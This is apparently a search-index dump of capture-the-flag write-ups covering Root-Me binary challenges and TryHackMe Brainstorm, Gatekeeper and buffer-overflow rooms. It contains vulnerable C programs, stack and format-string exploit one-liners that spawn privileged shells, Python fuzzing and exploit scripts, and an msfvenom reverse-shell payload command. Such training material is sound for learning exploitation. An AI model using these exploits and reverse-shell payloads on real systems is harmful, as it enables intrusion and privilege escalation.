    "objectID": "12a833d41a7ede1896170fef346778cc",
    "u": "https://bof.tymyrddin.dev/docs/root-me/elf-86-string-basic3",
    "t": "ELF x86: Format string bug basic 3 ",
    "c": "ELF x86: Format string bug basic 3  root-me challenge : Another way to exploit a format string bug. Environment configuration: PIE Position Independent Executable No RelRO Read Only relocations No NX Non-Executable Stack No ASLR Address Space Layout Randomization No SF Source Fortification No SSP Stack-Smashing Protection No SRC Source code access Yes Source code: #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <string.h> int main(int argc, char ** argv) { // char log_file = \"/var/log/bin_error.log\"; char outbuf[512]; char buffer[512]; char user[12]; char *username = \"root-me\"; // FILE *fp_log = fopen(log_file, \"a\"); printf(\"Username: \"); fgets(user, sizeof(user), stdin); user[strlen(user) - 1] = '\\0'; if (strcmp(user, username)) { sprintf (buffer, \"ERR Wrong user: %400s\", user); sprintf (outbuf, buffer); // fprintf (fp_log, \"%s\\n\", outbuf); printf(\"Bad username: %s\\n\", user); } else { printf(\"Hello %s ! How are you ?\\n\", user); } // fclose(fp_log); return 0; } Resources  Chaine de format - exploitation PHRACK - Advances in format string exploitation DEFCON 18 Advanced Format String Attacks Format String and Double-Free Attacks Les failles Format String",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "5e16444c26bffbf8bc501273d9175b79",
    "u": "https://bof.tymyrddin.dev/docs/root-me/elf-86-bss",
    "t": "ELF x86: BSS buffer overflow ",
    "c": "ELF x86: BSS buffer overflow  root-me challenge : Environment configuration: PIE Position Independent Executable No RelRO Read Only relocations No NX Non-Executable Stack No ASLR Address Space Layout Randomization No SF Source Fortification No SSP Stack-Smashing Protection No SRC Source code access Yes Source code: #include <stdio.h> #include <stdlib.h> char username[512] = {1}; void (*_atexit)(int) = exit; void cp_username(char *name, const char *arg) { while((*(name++) = *(arg++))); *name = 0; } int main(int argc, char **argv) { if(argc != 2) { printf(\"[-] Usage : %s <username>\\n\", argv[0]); exit(0); } cp_username(username, argv[1]); printf(\"[+] Running program with username : %s\\n\", username); _atexit(0); return 0; } Resources  Heap and BSS overflow 1 Heap and BSS overflow 2",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "fc418ee8dcc5f0fe0c38408f2f2aac3d",
    "u": "https://bof.tymyrddin.dev/docs/root-me/elf-86-stack-basic3",
    "t": "ELF x86: Stack buffer overflow basic 3 ",
    "c": "ELF x86: Stack buffer overflow basic 3  root-me challenge : An intermediate level to familiarize yourself with stack overflows. Environment configuration: PIE Position Independent Executable No RelRO Read Only relocations Yes NX Non-Executable Stack Yes ASLR Address Space Layout Randomization No SF Source Fortification No SSP Stack-Smashing Protection No SRC Source code access Yes Source code: #include <stdio.h> #include <sys/time.h> #include <sys/types.h> #include <unistd.h> #include <stdlib.h> void shell(void); int main() { char buffer[64]; int check; int i = 0; int count = 0; printf(\"Enter your name: \"); fflush(stdout); while(1) { if(count >= 64) printf(\"Oh no...Sorry !\\n\"); if(check == 0xbffffabc) shell(); else { read(fileno(stdin),&i,1); switch(i) { case '\\n': printf(\"\\a\"); break; case 0x08: count--; printf(\"\\b\"); break; case 0x04: printf(\"\\t\"); count++; break; case 0x90: printf(\"\\a\"); count++; break; default: buffer[count] = i; count++; break; } } } } void shell(void) { setreuid(geteuid(), geteuid()); system(\"/bin/bash\"); } 4*\\x08 is going to decrease the value of count by 4 to get the check variable, which needs to be 0xbffffabc (mind endian): app-systeme-ch16@challenge02:~$ cat <(python -c \"print '\\x08'*4 + '\\xbc\\xfa\\xff\\xbf'\") - | ./ch16 cat .passwd Resources  Débordement de tampon - dans la pile François Boisson : Buffer Overflow ou explication de «une faille de type bufferoverflow … (YouTube) Stack Bug - Exploitation avancee de buffer overflow Exploiting Stack Buffer Overflows in the Linux x86 Kernel 64 Bits Linux Stack Based Buffer Overflow",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "21d5d64e2f3d5111450a7e1afbcb66ae",
    "u": "https://bof.tymyrddin.dev/docs/root-me/elf-86-stack-basic4",
    "t": "ELF x86: Stack buffer overflow basic 4 ",
    "c": "ELF x86: Stack buffer overflow basic 4  root-me challenge : Can you return the env to me pleazzz? Environment configuration: PIE Position Independent Executable No RelRO Read Only relocations No NX Non-Executable Stack No ASLR Address Space Layout Randomization No SF Source Fortification No SSP Stack-Smashing Protection No SRC Source code access Yes Source code: #include <stdio.h> #include <stdlib.h> #include <dirent.h> #include <string.h> struct EnvInfo { char home[128]; char username[128]; char shell[128]; char path[128]; }; struct EnvInfo GetEnv(void) { struct EnvInfo env; char *ptr; if((ptr = getenv(\"HOME\")) == NULL) { printf(\"[-] Can't find HOME.\\n\"); exit(0); } strcpy(env.home, ptr); if((ptr = getenv(\"USERNAME\")) == NULL) { printf(\"[-] Can't find USERNAME.\\n\"); exit(0); } strcpy(env.username, ptr); if((ptr = getenv(\"SHELL\")) == NULL) { printf(\"[-] Can't find SHELL.\\n\"); exit(0); } strcpy(env.shell, ptr); if((ptr = getenv(\"PATH\")) == NULL) { printf(\"[-] Can't find PATH.\\n\"); exit(0); } strcpy(env.path, ptr); return env; } int main(void) { struct EnvInfo env; printf(\"[+] Getting env...\\n\"); env = GetEnv(); printf(\"HOME = %s\\n\", env.home); printf(\"USERNAME = %s\\n\", env.username); printf(\"SHELL = %s\\n\", env.shell); printf(\"PATH = %s\\n\", env.path); return 0; } app-systeme-ch8@challenge02:~$ export PATH=$PATH:`python -c \"print 'A'*160 + '\\x31\\xf9\\xff\\xbf' + '\\x2b\\xfb\\xff\\xbf'\"` app-systeme-ch8@challenge02:~$ ./ch8 [+] Getting env... [-] Can't find USERNAME. Need to think some more … Resources  Débordement de tampon - dans la pile Buffer Overflow ou explication de “une faille de type bufferoverflow” Exploitations avancees buffer overflow Stack Bug - Exploitation avancee de buffer overflow Runtime Attacks : Buffer OverFlow and Return Oriented Programming",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "b230e7ae6d5a08269e83a7460180fb62",
    "u": "https://bof.tymyrddin.dev/docs/thm/brainstorm",
    "t": "Brainstorm ",
    "c": "THM Brainstorm Brainstorm  Reverse engineer a chat program and write a script to exploit a Windows machine. Requirements  A small local lab . Scanning  The THM Brainstorm machine is blocking ping , so add the -Pn flag. sudo nmap -p- -T4 -Pn $MACHINE_IP Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-12 19:55 UTC Nmap scan report for ip-10-10-150-106.eu-west-1.compute.internal (10.10.150.106) Host is up (0.00090s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE 21/tcp open ftp 3389/tcp open ms-wbt-server 9999/tcp open abyss MAC Address: 02:32:AD:1A:9D:19 (Unknown) Nmap done: 1 IP address (1 host up) scanned in 88.14 seconds Enumeration  sudo nmap -p 21,3389,9999 -sV -sC -v -Pn -T4 $MACHINE_IP Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-12 20:02 UTC ... Nmap scan report for ip-10-10-150-106.eu-west-1.compute.internal (10.10.150.106) Host is up (0.0010s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can't get directory listing: TIMEOUT 3389/tcp open ms-wbt-server? | ssl-cert: Subject: commonName=brainstorm | Issuer: commonName=brainstorm | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2022-12-11T19:47:44 | Not valid after: 2023-06-12T19:47:44 | MD5: 851a44ee9405f33d1e4e6552448507be |_SHA-1: 16e8c4c018c0695babd7595e661649e955743057 | rdp-ntlm-info: | Target_Name: BRAINSTORM | NetBIOS_Domain_Name: BRAINSTORM | NetBIOS_Computer_Name: BRAINSTORM | DNS_Domain_Name: brainstorm | DNS_Computer_Name: brainstorm | Product_Version: 6.1.7601 |_ System_Time: 2022-12-12T20:05:27+00:00 |_ssl-date: 2022-12-12T20:05:57+00:00; -1s from scanner time. 9999/tcp open abyss? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: | Welcome to Brainstorm chat (beta) | Please enter your username (max 20 characters): Write a message: | NULL: | Welcome to Brainstorm chat (beta) |_ Please enter your username (max 20 characters): 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port9999-TCP:V=7.93%I=7%D=12/12%Time=639788F1%P=x86_64-pc-linux-gnu%r(N SF:ULL,52,\"Welcome\\x20to\\x20Brainstorm\\x20chat\\x20\\(beta\\)\\nPlease\\x20ente SF:r\\x20your\\x20username\\x20\\(max\\x2020\\x20characters\\):\\x20\")%r(GetReques SF:t,63,\"Welcome\\x20to\\x20Brainstorm\\x20chat\\x20\\(beta\\)\\nPlease\\x20enter\\ SF:x20your\\x20username\\x20\\(max\\x2020\\x20characters\\):\\x20Write\\x20a\\x20me SF:ssage:\\x20\")%r(HTTPOptions,63,\"Welcome\\x20to\\x20Brainstorm\\x20chat\\x20\\ SF:(beta\\)\\nPlease\\x20enter\\x20your\\x20username\\x20\\(max\\x2020\\x20characte SF:rs\\):\\x20Write\\x20a\\x20message:\\x20\")%r(FourOhFourRequest,63,\"Welcome\\x SF:20to\\x20Brainstorm\\x20chat\\x20\\(beta\\)\\nPlease\\x20enter\\x20your\\x20user SF:name\\x20\\(max\\x2020\\x20characters\\):\\x20Write\\x20a\\x20message:\\x20\")%r( SF:JavaRMI,63,\"Welcome\\x20to\\x20Brainstorm\\x20chat\\x20\\(beta\\)\\nPlease\\x20 SF:enter\\x20your\\x20username\\x20\\(max\\x2020\\x20characters\\):\\x20Write\\x20a SF:\\x20message:\\x20\")%r(GenericLines,63,\"Welcome\\x20to\\x20Brainstorm\\x20ch SF:at\\x20\\(beta\\)\\nPlease\\x20enter\\x20your\\x20username\\x20\\(max\\x2020\\x20c SF:haracters\\):\\x20Write\\x20a\\x20message:\\x20\")%r(RTSPRequest,63,\"Welcome\\ SF:x20to\\x20Brainstorm\\x20chat\\x20\\(beta\\)\\nPlease\\x20enter\\x20your\\x20use SF:rname\\x20\\(max\\x2020\\x20characters\\):\\x20Write\\x20a\\x20message:\\x20\")%r SF:(RPCCheck,63,\"Welcome\\x20to\\x20Brainstorm\\x20chat\\x20\\(beta\\)\\nPlease\\x SF:20enter\\x20your\\x20username\\x20\\(max\\x2020\\x20characters\\):\\x20Write\\x2 SF:0a\\x20message:\\x20\")%r(DNSVersionBindReqTCP,63,\"Welcome\\x20to\\x20Brains SF:torm\\x20chat\\x20\\(beta\\)\\nPlease\\x20enter\\x20your\\x20username\\x20\\(max\\ SF:x2020\\x20characters\\):\\x20Write\\x20a\\x20message:\\x20\")%r(DNSStatusReque SF:stTCP,63,\"Welcome\\x20to\\x20Brainstorm\\x20chat\\x20\\(beta\\)\\nPlease\\x20en SF:ter\\x20your\\x20username\\x20\\(max\\x2020\\x20characters\\):\\x20Write\\x20a\\x SF:20message:\\x20\")%r(Help,63,\"Welcome\\x20to\\x20Brainstorm\\x20chat\\x20\\(be SF:ta\\)\\nPlease\\x20enter\\x20your\\x20username\\x20\\(max\\x2020\\x20characters\\ SF:):\\x20Write\\x20a\\x20message:\\x20\")%r(SSLSessionReq,63,\"Welcome\\x20to\\x2 SF:0Brainstorm\\x20chat\\x20\\(beta\\)\\nPlease\\x20enter\\x20your\\x20username\\x2 SF:0\\(max\\x2020\\x20characters\\):\\x20Write\\x20a\\x20message:\\x20\")%r(Termina SF:lServerCookie,63,\"Welcome\\x20to\\x20Brainstorm\\x20chat\\x20\\(beta\\)\\nPlea SF:se\\x20enter\\x20your\\x20username\\x20\\(max\\x2020\\x20characters\\):\\x20Writ SF:e\\x20a\\x20message:\\x20\"); MAC Address: 02:32:AD:1A:9D:19 (Unknown) Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows NSE: Script Post-scanning. Initiating NSE at 20:05 Completed NSE at 20:05, 0.00s elapsed Initiating NSE at 20:05 Completed NSE at 20:05, 0.00s elapsed Initiating NSE at 20:05 Completed NSE at 20:05, 0.00s elapsed Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 190.79 seconds Raw packets sent: 6 (248B) | Rcvd: 4 (160B) Trying interacting with the service using netcat: nc MACHINE_IP 9999 nc 10.10.150.106 9999 Welcome to Brainstorm chat (beta) Please enter your username (max 20 characters): wah Write a message: hallo Mon Dec 12 12:09:08 2022 wah said: hallo Write a message: The message could be vulnerable to buffer overflow. Connecting to FTP through anonymous authentication: ftp 10.10.150.106 Connected to 10.10.150.106. 220 Microsoft FTP Service Name (10.10.150.106:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp> dir 200 EPRT command successful. 125 Data connection already open; Transfer starting. 08-29-19 07:36PM <DIR> chatserver 226 Transfer complete. ftp> cd chatserver 250 CWD command successful. ftp> dir 200 EPRT command successful. 125 Data connection already open; Transfer starting. 08-29-19 09:26PM 43747 chatserver.exe 08-29-19 09:27PM 30761 essfunc.dll The ftp server contains a chatserver.exe essfunc.dll file. Get the chatserver binaries chatserver.exe and essfunc.dll from the ftp service for analysis. ftp> binary 200 Type set to I. ftp> mget chatserver.exe essfunc.dll mget chatserver.exe [anpqy?]? y 200 EPRT command successful. 125 Data connection already open; Transfer starting. 100% |********************************************| 43747 13.58 MiB/s 00:00 ETA 226 Transfer complete. 43747 bytes received in 00:00 (13.03 MiB/s) mget essfunc.dll [anpqy?]? y 200 EPRT command successful. 125 Data connection already open; Transfer starting. 100% |********************************************| 30761 25.37 MiB/s 00:00 ETA 226 Transfer complete. 30761 bytes received in 00:00 (23.73 MiB/s) ftp> Start a web server on the Kali VM in the directory with the files (to download the files to the Windows VM): python3 -m http.server Exploiting buffer overflow  Fuzzing  Get the binary files from the Kali box, and start Immunity Debugger (with admin privileges and mona installed), attach it to the application, run it, and Go fuzzing to find out which amount of bytes will cause the application to crash. Use template: #!/usr/bin/env python3 import socket , time , sys ip = \"MACHINE_IP\" port = 1337 timeout = 5 prefix = \"\" string = prefix + \"A\" * 100 while True : try : with socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) as s : s . settimeout ( timeout ) s . connect (( ip , port )) s . recv ( 1024 ) print ( \"Fuzzing with {} bytes\" . format ( len ( string ) - len ( prefix ))) s . send ( bytes ( string , \"latin-1\" )) s . recv ( 1024 ) except socket . error : print ( \"Fuzzing crashed at {} bytes\" ....",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "190d4e019883c498efcc98cefba5a8cb",
    "u": "https://bof.tymyrddin.dev/docs/root-me/elf-86-race-condition",
    "t": "ELF x86: Race condition ",
    "c": "ELF x86: Race condition  root-me challenge : Environment configuration: PIE Position Independent Executable No RelRO Read Only relocations No NX Non-Executable Stack No ASLR Address Space Layout Randomization No SF Source Fortification No SSP Stack-Smashing Protection No SRC Source code access Yes Source code: #include <stdio.h> #include <string.h> #include <sys/ptrace.h> #include <unistd.h> #include <sys/types.h> #include <sys/stat.h> #include <fcntl.h> #include <stdlib.h> #define PASSWORD \"/challenge/app-systeme/ch12/.passwd\" #define TMP_FILE \"/tmp/tmp_file.txt\" int main(void) { int fd_tmp, fd_rd; char ch; if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) { printf(\"[-] Don't use a debugguer !\\n\"); abort(); } if((fd_tmp = open(TMP_FILE, O_WRONLY | O_CREAT, 0444)) == -1) { perror(\"[-] Can't create tmp file \"); goto end; } if((fd_rd = open(PASSWORD, O_RDONLY)) == -1) { perror(\"[-] Can't open file \"); goto end; } while(read(fd_rd, &ch, 1) == 1) { write(fd_tmp, &ch, 1); } close(fd_rd); close(fd_tmp); usleep(250000); end: unlink(TMP_FILE); return 0; } Resources  Secure Coding in C and C++ Race Conditions Race Condition Vulnerability Lab Exploiting Unix File-System Race Condition via Algorithmic Complexity Attacks",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "36fa763a9fa186a18b9708ba7e5bb654",
    "u": "https://bof.tymyrddin.dev/docs/root-me/elf-64-stack-basic",
    "t": "ELF x64: Stack buffer overflow basic ",
    "c": "ELF x64: Stack buffer overflow basic  root-me challenge : first step to 64 bits. Environment configuration: PIE Position Independent Executable No RelRO Read Only relocations Yes NX Non-Executable Stack Yes ASLR Address Space Layout Randomization Yes SF Source Fortification No SSP Stack-Smashing Protection No SRC Source code access Yes Source code: #include <stdio.h> #include <string.h> #include <stdlib.h> #include <sys/types.h> #include <unistd.h> /* gcc -o ch35 ch35.c -fno-stack-protector -no-pie -Wl,-z,relro,-z,now,-z,noexecstack */ void callMeMaybe(){ char *argv[] = { \"/bin/bash\", \"-p\", NULL }; execve(argv[0], argv, NULL); } int main(int argc, char **argv){ char buffer[256]; int len, i; scanf(\"%s\", buffer); len = strlen(buffer); printf(\"Hello %s\\n\", buffer); return 0; } The program allocates 288 bytes for the function, and 272 bytes for the buffer, before calling the scanf function. Write 280 bytes and then the return address (to callMeMaybe ). app-systeme-ch35@challenge03:~$ python -c \"print 'A'*280 + 'DDDD'\" | ./ch35 Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�� Segmentation fault app-systeme-ch35@challenge03:~$ cat <(python -c 'print \"A\"*280+\"\\xe7\\x05\\x40\"+\"\\x00\"*5') - | ./ch35 Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�� id uid=1135(app-systeme-ch35) gid=1135(app-systeme-ch35) euid=1235(app-systeme-ch35-cracked) groups=1135(app-systeme-ch35),100(users) cat .passwd Resources  64 Bits Linux Stack Based Buffer Overflow",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "58cb3b1af43d6440a1e960a059eea127",
    "u": "https://bof.tymyrddin.dev/docs/thm/overflow1",
    "t": "Using Immunity Debugger ",
    "c": "Using Immunity Debugger  Run Kali VM connected to THM over VPN. Start the Room Machine and note the IP address. Remote desktop from your Kali VM to the IP address of the Machine using Remmina. xfreerdp /u:admin /p:password /cert:ignore /v:MACHINE_IP /workarea Start Immunity  Immunity setup In the Machine, right-click the Immunity Debugger icon on the Desktop and choose Run as administrator . When Immunity loads, configure mona (bottom of Immunity): !mona config -set workingfolder c:\\mona\\%p Click the open file icon, or choose File -> Open . Navigate to the vulnerable-apps folder on the admin user’s desktop, and then the oscp folder. Select the oscp.exe binary and open it. The binary will open in a “paused” state, so click the red play icon or choose Debug -> Run . In a terminal window, the oscp.exe binary should be running, and tells us that it is listening on port 1337 . On the Kali box, connect to port 1337 on MACHINE using netcat: nc MACHINE_IP 1337 Type “HELP” and press Enter. Note that there are 10 different OVERFLOW commands numbered 1 - 10. Type “OVERFLOW1 test” and press enter. The response should be “OVERFLOW1 COMPLETE”. Terminate the connection. Fuzzing the program  To fuzz the ospc.exe program to see if it is vulnerable, send it a long string of characters. This long string of characters will eventually exceed the memory buffer causing the buffer overflow. Use the script below and adapt it with the IP address of the host and the overflow to target. #!/usr/bin/env python3 import socket , time , sys ip = \"MACHINE_IP\" port = 1337 timeout = 5 prefix = \"OVERFLOW1 \" string = prefix + \"A\" * 100 while True : try : with socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) as s : s . settimeout ( timeout ) s . connect (( ip , port )) s . recv ( 1024 ) print ( \"Fuzzing with {} bytes\" . format ( len ( string ) - len ( prefix ))) s . send ( bytes ( string , \"latin-1\" )) s . recv ( 1024 ) except : print ( \"Fuzzing crashed at {} bytes\" . format ( len ( string ) - len ( prefix ))) sys . exit ( 0 ) string += 100 * \"A\" time . sleep ( 1 ) Make sure ospc.exe is running in Immunity Debugger, then launch the fuzzing script. If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. Make a note of the largest number of bytes that were sent. Creating a cyclic pattern  Finding the EIP offset requires creating a pattern with the length that was required to crash the program. For example, by using Metasploit and adding 400 bytes to the 2000 that crashed the server: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400 Edit the python payload below and add the cyclic pattern to the payload variable: import socket ip = \"MACHINE_IP\" port = 1337 prefix = \"OVERFLOW1 \" offset = 0 overflow = \"A\" * offset retn = \"\" padding = \"\" payload = \"\" postfix = \"\" buffer = prefix + overflow + retn + padding + payload + postfix s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) try : s . connect (( ip , port )) print ( \"Sending evil buffer...\" ) s . send ( bytes ( buffer + \" \\r\\n \" , \"latin-1\" )) print ( \"Done!\" ) except socket . error : print ( \"Could not connect.\" ) Name it exploit.py and launch it. python3 exploit.py After the Python exploit crashed the script, go to the Immunity debugger and run the mona command to find the EIP offset: !mona findmsp -distance 2000 This should open the Log window. If it does not then open it manually and look for the following entry in the output. EIP contains normal pattern : ... (offset 1978) Update the exploit.py script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to BBBB . Restart oscp.exe in Immunity and run the modified exploit.py script again. The EIP register should now be overwritten with the 4 B’s (e.g. 42424242 ). Finding bad characters  Bad characters are unwanted characters that break the shellcode. For Buffer Overflows to be successful we have to make sure payloads do not contain any bad characters (badchars). Badchars such as null bytes ( \\x00 ) could cause a payload to crash the program rather than executing the code specified. !mona bytearray -b \"\\x00\" To use Mona to create a Byte Array to compare the payload to, create a Byte Array which will exclude all the badchars found, starting with the Null Byte. To create a byte array to use as a payload: for x in range(1, 256): print(\"\\\\x\" + \"{:02x}\".format(x), end='') print() Name it, run it, and paste the results as payload in the exploit.py script. Reopen and run the vulnerable oscp.exe application in Immunity Debugger. Then run the exploit script. When the script has completed, go back to the Immunity Debugger and look for the ESP register in the CPU window. Right-click the ESP register, copy the address to the clipboard, then run the following mona command to compare it to the Byte Array that Mono created earlier: !mona compare -f C:\\mona\\oscp\\bytearray.bin -a 01AFFA30 This produces a window containing all the bad characters that need to eliminated from our script. Note that some of these characters may not be bad characters. For example \\x07 could be bleeding into \\x08 and making it look bad. The process must be repeated for each “bad character”. \\x00  Create byte array !mona bytearray -b \"\\x00\" Remove byte from payload string Run Get ESP address Compare the hex dump with characters sent !mona compare -f C:\\mona\\oscp\\bytearray.bin -a 018BFA30 \\x00\\x07  Create byte array !mona bytearray -b \"\\x00\\x07\" Remove \\x07 byte from payload string Run Get ESP address Compare the hex dump with characters sent !mona compare -f C:\\mona\\oscp\\bytearray.bin -a 019AFA30 \\x00\\x07\\x2e  Create byte array !mona bytearray -b \"\\x00\\x07\\x2e\" Remove \\x2e byte from payload string Run Get ESP address Compare the hex dump with characters sent !mona compare -f C:\\mona\\oscp\\bytearray.bin -a 019AFA30 Keep rinsing until the comparison results status returns Unmodified . This indicates that no more badchars are present. The results window now looks like: No badchars left Finding the jump point  When an access violation occurs, the ESP register points to memory which contains the data which was sent to the application. JMP ESP Instruction is used to redirect the code execution to that location. To find the JMP ESP, use a module of mona with –cpb option and all the bad characters found earlier, to prevent mona returning a memory pointer with badchars. With all badchars identified, to use Mona to find a jump point in the application: !mona jmp -r esp -cpb \"\\x00\\x07\\x2e\\xa0\" Generate payload  Use msfvenom to create the payload: msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 EXITFUNC=thread -b \"\\x00\\x07\\x2e\\xa0\" -f c Endianness  There are two ways by which a computer stores multibyte data types like int and float, these two types are known as Little Endian and Big Endian. x86 is known as Little Endian architecture. In this architecture, the last byte of the binary is stored first. In Big Endian, the exact opposite happens: The first byte of the binary is stored first. When working with x86 architecture the JMP ESP address must be converted into Little Endian format. When adding the return address, reverse the JMP address. NOP-sled  A NOP-sled (No Operation sled) is a sequence of no-operation instructions which is responsible for sliding the CPU’s execution flow to the next memory address. Prepending nops before the shellcode, it does not matter where the buffer is located. When the return pointer hits the NOP-sled then as the name suggests it is going to slide the return address until it reaches the beginning of the shellcode. NOP values are different for different CPUs. To create ssome space in memory for the payload to unpack itself, set the padding variable to a string of 16 or more nops ( \"\\x90\" ) bytes: padding = \"\\x90\" * 16 Exploit  With the correct prefix, offset, return address, padding, and payload set,...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "6426364d6d95a190805d770a8b7f9a87",
    "u": "https://bof.tymyrddin.dev/docs/root-me/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Root-me App-System challenges: Login credentials are provided. Obtain additional rights by exploiting program weaknesses and get a password to validate challenges on the portal. Why?  Practice exploitation of programs vulnerable to buffer overflow. How?  ELF x86: Stack buffer overflow basic 1 ELF x64: Basic heap overflow ELF x86: Stack buffer overflow basic 2 ELF x86: Format string bug basic 1 ELF x64: Stack buffer overflow basic ELF x86: Format string bug basic 2 ELF x86: Race condition ELF ARM: Stack buffer overflow basic ELF x86: Stack buffer overflow basic 3 ELF x86: Use after free basic ELF x86: BSS buffer overflow ELF x86: Stack buffer overflow basic 4 ELF x86: Stack buffer overflow basic 6 ELF x86: Format String Bug Basic 3 ELF ARM: Basic ROP ELF x86: Stack buffer overflow C++ vtables ELF x86: Stack buffer overflow basic 5 ELF x86: Remote format string bug",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "d038fb625d8b6fd628c67164b11a043a",
    "u": "https://bof.tymyrddin.dev/docs/thm/gatekeeper",
    "t": "Gatekeeper ",
    "c": "THM Gatekeeper Gatekeeper  Can you get past the gate and through the fire? Requirements  A small local lab . Scanning  nmap -p- -T4 -Pn $MACHINE_IP Starting Nmap 7.60 ( https://nmap.org ) at 2022-12-13 13:46 GMT Nmap scan report for ip-10-10-110-250.eu-west-1.compute.internal (10.10.110.250) Host is up (0.00044s latency). Not shown: 65524 closed ports PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server 31337/tcp open Elite 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49160/tcp open unknown 49161/tcp open unknown 49162/tcp open unknown MAC Address: 02:D1:76:28:34:57 (Unknown) Nmap done: 1 IP address (1 host up) scanned in 1642.77 seconds Enumeration  sudo nmap -p 135,139,445,3389,31337 -sV -sC -v -Pn -T4 $MACHINE_IP Starting Nmap 7.60 ( https://nmap.org ) at 2022-12-13 14:17 GMT NSE: Loaded 146 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 14:17 Completed NSE at 14:17, 0.00s elapsed Initiating NSE at 14:17 Completed NSE at 14:17, 0.00s elapsed Initiating ARP Ping Scan at 14:17 Scanning 10.10.110.250 [1 port] Completed ARP Ping Scan at 14:17, 0.22s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 14:17 Completed Parallel DNS resolution of 1 host. at 14:17, 0.00s elapsed Initiating SYN Stealth Scan at 14:17 Scanning ip-10-10-110-250.eu-west-1.compute.internal (10.10.110.250) [5 ports] Discovered open port 31337/tcp on 10.10.110.250 Completed SYN Stealth Scan at 14:17, 1.24s elapsed (5 total ports) Initiating Service scan at 14:17 Scanning 1 service on ip-10-10-110-250.eu-west-1.compute.internal (10.10.110.250) Completed Service scan at 14:20, 146.16s elapsed (1 service on 1 host) NSE: Script scanning 10.10.110.250. Initiating NSE at 14:20 Completed NSE at 14:20, 0.01s elapsed Initiating NSE at 14:20 Completed NSE at 14:20, 1.01s elapsed Nmap scan report for ip-10-10-110-250.eu-west-1.compute.internal (10.10.110.250) Host is up (0.00018s latency). PORT STATE SERVICE VERSION 135/tcp filtered msrpc 139/tcp filtered netbios-ssn 445/tcp filtered microsoft-ds 3389/tcp filtered ms-wbt-server 31337/tcp open Elite? | fingerprint-strings: | FourOhFourRequest: | Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0 | Hello | GenericLines: | Hello | Hello | GetRequest: | Hello GET / HTTP/1.0 | Hello | HTTPOptions: | Hello OPTIONS / HTTP/1.0 | Hello | Help: | Hello HELP | Kerberos: | Hello !!! | LDAPSearchReq: | Hello 0 | Hello | LPDString: | Hello | default!!! | RTSPRequest: | Hello OPTIONS / RTSP/1.0 | Hello | SIPOptions: | Hello OPTIONS sip:nm SIP/2.0 | Hello Via: SIP/2.0/TCP nm;branch=foo | Hello From: <sip:nm@nm>;tag=root | Hello To: <sip:nm2@nm2> | Hello Call-ID: 50000 | Hello CSeq: 42 OPTIONS | Hello Max-Forwards: 70 | Hello Content-Length: 0 | Hello : <sip:nm@nm> | Hello Accept: application/sdp | Hello | SSLSessionReq, TLSSessionReq: |_ Hello 1 service unrecognized despite returning data. ... NSE: Script Post-scanning. Initiating NSE at 14:20 Completed NSE at 14:20, 0.00s elapsed Initiating NSE at 14:20 Completed NSE at 14:20, 0.00s elapsed Read data files from: /usr/bin/../share/nmap Service detection performed. Please 